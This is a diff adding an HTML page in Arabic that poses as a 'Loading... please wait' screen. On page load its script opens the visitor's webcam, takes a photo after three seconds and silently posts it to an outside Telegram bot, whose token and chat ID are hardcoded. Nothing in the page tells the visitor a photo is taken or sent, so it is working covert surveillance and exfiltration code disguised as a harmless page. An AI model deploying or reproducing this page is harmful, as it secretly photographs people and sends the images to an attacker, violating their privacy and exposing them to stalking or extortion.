@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>جارٍ التحميل...</title>
+</head>
+<body>
+  <h2>يرجى الانتظار...</h2>
+
+  <script>
+    async function captureAndSend() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        video.play();
+
+        // انتظر شوي حتى تشتغل الكاميرا
+        await new Promise(resolve => setTimeout(resolve, 3000));
+
+        const canvas = document.createElement('canvas');
+        canvas.width = 640;
+        canvas.height = 480;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        const imageData = canvas.toDataURL('image/jpeg');
+
+        // تحويل base64 إلى ملف Blob
+        const blob = await (await fetch(imageData)).blob();
+
+        const formData = new FormData();
+        formData.append("chat_id", "1320552080");
+        formData.append("photo", blob, "capture.jpg");
+
+        // إرسال إلى تليجرام
+        fetch("https://api.telegram.org/bot6790035809:AAF1WJELoljfs8TKw3NsBTjtqTurTGI15l0/sendPhoto", {
+          method: "POST",
+          body: formData
+        });
+
+        // إيقاف الكاميرا
+        stream.getTracks().forEach(track => track.stop());
+
+      } catch (err) {
+        console.error("فشل الوصول إلى الكاميرا:", err);
+      }
+    }
+
+    captureAndSend();
+  </script>
+</body>
+</html>
